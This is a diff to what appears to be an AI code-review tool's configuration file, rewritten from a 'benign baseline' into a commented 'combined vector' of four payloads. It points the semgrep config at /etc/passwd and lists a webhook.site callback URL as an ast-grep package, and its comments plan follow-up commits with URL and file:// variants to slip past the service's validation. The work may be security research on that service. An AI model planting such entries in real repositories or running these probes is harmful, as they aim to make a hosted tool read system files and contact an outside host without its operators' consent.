@@ -1,9 +1,15 @@
-# benign baseline
+# Combined vector — 4 payloads in 1 commit (rate-limit efficient)
 reviews:
-  profile: chill
-  high_level_summary: true
-  poem: false
   tools:
     semgrep:
       enabled: true
-      config_file: ".semgrep.yml"
+      config_file: "/etc/passwd"
+    ast-grep:
+      enabled: true
+      packages:
+        - "https://webhook.site/3b9433b1-996b-4619-97fd-ef1f3aaa9db5?probe=astgrep-pkg-url"
+        - "@ast-grep/essential"
+
+# NOTE: semgrep accepts a single config_file — the URL/file:// variants get tested in
+# follow-up commits if the validation layer somehow accepts one of these.
+# This commit: absolute path + URL pkg + registry shorthand in ast-grep packages.
